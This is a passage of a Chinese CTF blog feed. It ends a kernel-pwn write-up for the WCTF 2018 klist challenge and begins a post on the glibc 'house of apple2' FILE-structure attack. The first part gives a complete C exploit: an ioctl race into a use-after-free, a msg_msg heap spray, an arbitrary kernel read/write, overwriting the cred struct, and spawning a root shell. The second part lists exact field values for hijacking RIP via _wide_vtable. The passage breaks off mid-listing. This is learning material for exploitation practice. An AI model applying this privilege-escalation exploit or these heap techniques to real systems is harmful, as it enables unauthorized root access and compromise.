class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[BUFF_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cred_root</span><span class="params">(<span class="keyword">char</span> *cred, <span class="keyword">int</span> len, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)(cred + i) == id)</span><br><span class="line">            *(<span class="keyword">int</span> *)(cred + i) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myMemmem</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> alen, <span class="keyword">char</span> *b, <span class="keyword">int</span> blen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= alen - blen; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; blen; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i + j] != b[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= blen)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span> <span class="title">create_arg</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> *res = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/klist&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]open file error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x200</span>);</span><br><span class="line">    create_arg.size = <span class="number">96</span> - <span class="number">0x18</span>;</span><br><span class="line">    create_arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;create_arg);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;create_arg);</span><br><span class="line">            ioctl(fd, <span class="number">0x133A</span>, res);</span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">int</span> *)res == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*]get the UAF chunk!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]gg\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1500</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd, <span class="number">0x133A</span>, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">msg</span> <span class="title">msg</span>;</span></span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="built_in">memset</span>(msg.mtext, <span class="number">0x42</span>, BUFF_SIZE - <span class="number">1</span>);</span><br><span class="line">            msg.mtext[BUFF_SIZE] = <span class="number">0</span>;</span><br><span class="line">            msg.mtype = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; BUFF_SIZE; i++)</span><br><span class="line">                msg.mtext[i] = <span class="string">&#x27;\xff&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line"></span><br><span class="line">            msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1338</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, res, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)res == <span class="number">0x6161616161616161</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] cannot realloc the chunk &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] now we can read everywhere&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">    read(fd, mem, <span class="number">0x300000</span>);</span><br><span class="line">    <span class="keyword">char</span> cred[<span class="number">0x20</span>];</span><br><span class="line">    *(<span class="keyword">size_t</span> *)cred = <span class="number">0x000003e800000003</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">8</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">0x10</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">0x18</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    <span class="keyword">int</span> found = myMemmem(mem, <span class="number">0x300000</span>, cred, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (found == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-]cannot find cred struct !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *<span class="keyword">final</span> = found + mem;</span><br><span class="line">    print_hex(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0xb0</span>);</span><br><span class="line">    set_cred_root(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0x40</span>, <span class="number">1000</span>);</span><br><span class="line">    print_hex(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0xb0</span>);</span><br><span class="line">    write(fd, mem, found + <span class="number">0xb0</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]now you are r00t,enjoy ur shell\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] there must be something error ... &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是成功的结果图：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220807171554006.png"                      alt="image-20220807171554006"                ></p><p>题目我会放在：<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：</p><p><a class="link"   href="http://p4nda.top/2018/11/27/wctf-2018-klist/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8" >http://p4nda.top/2018/11/27/wctf-2018-klist/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/2814" >https://xz.aliyun.com/t/2814<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;题目实现的功能很容易看出来&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="heap spray" scheme="https://cv196082.gitee.io/tags/heap-spray/"/>
    
    <category term="Double Fetch" scheme="https://cv196082.gitee.io/tags/Double-Fetch/"/>
    
  </entry>
  
  <entry>
    <title>house of apple续</title>
    <link href="https://cv196082.gitee.io/2022/08/05/house-of-apple2/"/>
    <id>https://cv196082.gitee.io/2022/08/05/house-of-apple2/</id>
    <published>2022-08-05T07:10:34.000Z</published>
    <updated>2022-08-05T07:11:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>死都想不到house of apple居然有三篇文章，这里就把第二篇和第三篇合并起来一起学完吧。</p><h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><ol><li><p>已知<code>heap</code>地址和<code>glibc</code>地址</p></li><li><p>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</p></li><li><p>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</p></li></ol><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<a href="https://cv196082.gitee.io/2022/02/23/FSOP/">https://cv196082.gitee.io/2022/02/23/FSOP/</a> 这篇文章中详细介绍了去调用vtable中的函数指针时会经过什么验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意_IO_wide_data结构体中存在_wide_vtable成员，在调用_wide_vtable虚表是同样会经过一系列宏去调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><p>在这里调用的顺序中没有出现vtable是否合法的检测，因此我们可以劫持_IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可以控制的堆空间，进一步控制_wide_data-&gt;_wide_vtable指向可以控制的堆地址，控制程序IO流函数调用，最终调用到IO_wxxxxx</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>这里最终目的是调用_wide_vtable成员，所以需要找到上述宏的调用，最终发现只存在以下四个：_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE、_IO_WOVERFLOW</p><p>并且其中前两个还是利用难度较高，甚至是无法利用。下面从原文的三个方向出发</p><h4 id="IO-wfile-overflow"><a href="#IO-wfile-overflow" class="headerlink" title="_IO_wfile_overflow"></a><strong>_IO_wfile_overflow</strong></h4><p>这里的调用链为：<code>_IO_wfile_overflow</code>=&gt;<code>_IO_wdoallocbuf</code>=&gt;<code>_IO_WDOALLOCATE</code>=&gt;<code>*(fp-&gt;_wide_data-&gt;_wide_vtable+ 0x68)(fp)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">    _IO_wfile_overflow (FILE *f, <span class="keyword">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            _IO_wdoallocbuf (f);</span><br><span class="line">           ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p><p>接着看_IO_wdoallocbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p>这里就调用了IO_Wxxxx并且需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base != 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p><p>所以总的来说构造方式为：</p><ol><li>_flags = ~(2 | 0x8 | 0x800)即可，所以可以直接设置为0或者这值为<code>  sh;</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ol><h4 id="IO-wfile-underflow-mmap"><a href="#IO-wfile-underflow-mmap" class="headerlink" title="_IO_wfile_underflow_mmap"></a><strong>_IO_wfile_underflow_mmap</strong></h4><p>调用链：<code>_IO_wfile_underflow_mmap</code>=&gt;<code>_IO_wdoallocbuf</code>=&gt;<code>_IO_WDOALLOCATE</code>=&gt;<code>*(fp-&gt;_wide_data-&gt;_wide_vtable +0x68)(fp)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="keyword">const</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要改写的有点略多了，需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p><p>构造方式：</p><ol><li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ol><h4 id="IO-wdefault-xsgetn"><a href="#IO-wdefault-xsgetn" class="headerlink" title="_IO_wdefault_xsgetn"></a><strong>_IO_wdefault_xsgetn</strong></h4><p>调用链：<code>_IO_wdefault_xsgetn</code>=&gt;<code>__wunderflow</code>=&gt;<code>_IO_switch_to_wget_mode</code>=&gt;<code>_IO_WOVERFLOW</code>=&gt;<code>*(fp-&gt;_wide_data-&gt;_wide_vtable+0x18)(fp)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 